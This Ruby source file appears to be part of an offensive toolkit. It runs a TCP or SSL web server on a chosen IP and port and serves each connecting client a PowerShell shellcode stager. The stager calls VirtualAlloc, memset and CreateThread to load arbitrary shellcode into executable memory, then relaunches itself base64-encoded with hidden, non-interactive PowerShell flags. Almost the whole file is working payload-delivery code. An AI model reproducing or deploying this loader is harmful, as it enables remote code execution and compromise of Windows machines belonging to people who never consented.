#!/usr/bin/env ruby
require_relative 'core'
include MainCommands
class Server
  def get_host
    host_name = [(get_input('Enter the host ip to listen on: ') ), $stdin.gets.rstrip][1]
    ip = host_name.split('.')
    if ip[0] == nil or ip[1] == nil or ip[2] == nil or ip[3] == nil
      print_error("Not a valid IP\n")
      get_host()
    end
    print_success("Using #{host_name} as server\n")
    return host_name
  end
  def get_port
    port = [(get_input('Enter the port you would like to use or leave blank for [443]: ') ), $stdin.gets.rstrip][1]
    if port == ''
      port = '443'
      print_success("Using #{port}\n")
      return port
    elsif not (1..65535).cover?(port.to_i)
      print_error("Not a valid port\n")
      sleep(1)
      port()
    else
      print_success("Using #{port}\n")
      return port
    end
  end
  def ruby_web_server(port,ssl=nil,host,shellcode)
    time = Time.now.localtime.strftime("%a %d %b %Y %H:%M:%S %Z")
    if ssl
      print_info("Starting SSL Server!\n")
      server = ssl_setup(host,port.to_i)
    else
      print_info("Starting Server!\n")
      server = TCPServer.open(host,port.to_i)
    end
    resp = %($1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = #{shellcode};$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\\syswow64\\WindowsPowerShell\\v1.0\\powershell";$cmd = "-nop -noni -enc";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $gq";})
    loop {
      Thread.start(server.accept) do |client|
        print_success("Client connected!\n")
        headers = ["HTTP/1.1 200 OK",
                   "Date: #{time}",
                   "Server: Ruby",
                   "Content-Type: text/html; charset=iso-8859-1",
                   "Content-Length: #{resp.length}\r\n\r\n"].join("\r\n")
        client.print headers
        client.print "#{resp}\n"
        client.close
      end
    }
  end
end